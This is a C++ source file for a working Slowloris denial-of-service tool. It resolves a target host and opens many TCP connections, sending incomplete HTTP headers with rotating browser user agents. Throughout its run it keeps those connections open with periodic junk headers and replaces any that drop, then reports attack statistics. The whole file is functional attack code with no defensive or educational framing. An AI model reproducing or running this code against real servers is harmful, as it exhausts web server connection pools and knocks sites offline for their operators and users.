#include "slowloris.hpp"
#include "config.hpp"

#include <sstream>
#include <cstring>
#include <algorithm>

#ifdef _WIN32
    #pragma comment(lib, "ws2_32.lib")
    #define CLOSE_SOCKET closesocket
#else
    #include <fcntl.h>
    #include <errno.h>
    #define CLOSE_SOCKET ::close
#endif

static const std::vector<std::string> SLOWLORIS_USER_AGENTS = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
};

Slowloris::Slowloris(const std::string& target, int duration, int threads, int port,
                     std::function<void(const std::string&)> callback)
    : target_(target)
    , duration_(duration)
    , num_sockets_(threads)
    , port_(port)
    , callback_(callback)
{
}

Slowloris::~Slowloris() {
    stop();
}

std::string Slowloris::resolve_host(const std::string& hostname) {
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(hostname.c_str(), nullptr, &hints, &res) != 0 || !res) {
        return "";
    }

    char ip[INET_ADDRSTRLEN];
    auto* addr = reinterpret_cast<struct sockaddr_in*>(res->ai_addr);
    inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
    freeaddrinfo(res);
    return std::string(ip);
}

SOCKET Slowloris::create_connection(const std::string& ip) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

#ifdef _WIN32
    DWORD timeout_ms = 10000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout_ms, sizeof(timeout_ms));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout_ms, sizeof(timeout_ms));
#else
    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
#endif

    struct sockaddr_in server{};
    server.sin_family = AF_INET;
    server.sin_port = htons(static_cast<uint16_t>(port_));
    inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        CLOSE_SOCKET(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

void Slowloris::send_partial_header(SOCKET sock) {
    thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<size_t> ua_dist(0, SLOWLORIS_USER_AGENTS.size() - 1);

    std::string ua = SLOWLORIS_USER_AGENTS[ua_dist(rng)];

    std::ostringstream header;
    header << "GET /?q=" << rng() << " HTTP/1.1\r\n"
           << "Host: " << target_ << "\r\n"
           << "User-Agent: " << ua << "\r\n"
           << "Accept-Language: en-US,en;q=0.5\r\n";
    // Intentionally not sending final \r\n to keep connection open

    std::string hdr = header.str();
    send(sock, hdr.c_str(), static_cast<int>(hdr.size()), 0);
}

void Slowloris::keep_alive_worker() {
    thread_local std::mt19937 rng(std::random_device{}());

    while (!stop_flag_.load()) {
        // Sleep ~10 seconds, checking stop flag periodically
        for (int i = 0; i < 100 && !stop_flag_.load(); i++) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        if (stop_flag_.load()) break;

        std::lock_guard<std::mutex> lock(sockets_mtx_);

        // Send keep-alive header on all active sockets
        auto it = sockets_.begin();
        while (it != sockets_.end()) {
            std::uniform_int_distribution<int> dist(1, 5000);
            std::string header = "X-a: " + std::to_string(dist(rng)) + "\r\n";
            int result = send(*it, header.c_str(), static_cast<int>(header.size()), 0);
            if (result < 0) {
                // Connection died, remove it
                CLOSE_SOCKET(*it);
                it = sockets_.erase(it);
                connections_active_--;
            } else {
                ++it;
            }
        }
    }
}

std::map<std::string, std::string> Slowloris::run() {
    stop_flag_.store(false);
    connections_opened_.store(0);
    connections_active_.store(0);

    if (callback_) {
        callback_("Starting Slowloris attack on " + target_ + ":" + std::to_string(port_));
    }

    std::string ip = resolve_host(target_);
    if (ip.empty()) {
        std::map<std::string, std::string> stats;
        stats["error"] = "Failed to resolve host: " + target_;
        return stats;
    }

    auto start_time = std::chrono::steady_clock::now();

    // Open initial connections
    for (int i = 0; i < num_sockets_ && !stop_flag_.load(); i++) {
        SOCKET sock = create_connection(ip);
        if (sock != INVALID_SOCKET) {
            send_partial_header(sock);
            std::lock_guard<std::mutex> lock(sockets_mtx_);
            sockets_.push_back(sock);
            connections_opened_++;
            connections_active_++;
        }
    }

    if (callback_) {
        callback_("Opened " + std::to_string(connections_active_.load()) + " connections");
    }

    // Start keep-alive thread
    std::thread keep_alive_thread(&Slowloris::keep_alive_worker, this);

    // Main loop: maintain connections and replenish dead ones
    while (!stop_flag_.load()) {
        auto elapsed = std::chrono::steady_clock::now() - start_time;
        if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() >= duration_) {
            stop_flag_.store(true);
            break;
        }

        // Replenish dead connections
        {
            std::lock_guard<std::mutex> lock(sockets_mtx_);
            int needed = num_sockets_ - static_cast<int>(sockets_.size());
            for (int i = 0; i < needed && !stop_flag_.load(); i++) {
                SOCKET sock = create_connection(ip);
                if (sock != INVALID_SOCKET) {
                    send_partial_header(sock);
                    sockets_.push_back(sock);
                    connections_opened_++;
                    connections_active_++;
                }
            }
        }

        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    stop_flag_.store(true);

    if (keep_alive_thread.joinable()) {
        keep_alive_thread.join();
    }

    // Close all sockets
    {
        std::lock_guard<std::mutex> lock(sockets_mtx_);
        for (auto& s : sockets_) {
            CLOSE_SOCKET(s);
        }
        sockets_.clear();
    }

    auto end_time = std::chrono::steady_clock::now();
    auto total_seconds = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
    if (total_seconds == 0) total_seconds = 1;

    std::map<std::string, std::string> stats;
    stats["attack_type"] = "Slowloris";
    stats["target"] = target_ + ":" + std::to_string(port_);
    stats["duration"] = std::to_string(total_seconds) + "s";
    stats["sockets_requested"] = std::to_string(num_sockets_);
    stats["connections_opened"] = std::to_string(connections_opened_.load());
    stats["peak_active_connections"] = std::to_string(connections_active_.load());

    return stats;
}

void Slowloris::stop() {
    stop_flag_.store(true);
    for (auto& t : threads_) {
        if (t.joinable()) t.join();
    }
    threads_.clear();

    std::lock_guard<std::mutex> lock(sockets_mtx_);
    for (auto& s : sockets_) {
        CLOSE_SOCKET(s);
    }
    sockets_.clear();
}
